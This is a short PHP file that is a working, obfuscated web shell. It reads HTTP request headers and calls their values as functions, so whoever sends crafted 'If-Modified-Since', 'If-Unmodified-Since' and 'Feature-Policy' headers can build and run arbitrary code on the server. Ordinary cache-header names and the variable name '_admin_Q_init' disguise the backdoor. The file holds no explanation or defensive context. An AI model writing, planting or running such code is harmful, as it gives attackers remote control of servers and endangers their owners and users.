<?php

$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Modified-Since'])) {
    $_admin_Q_init = $_HEADERS['If-Modified-Since']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['Feature-Policy']));
    $_admin_Q_init();
}
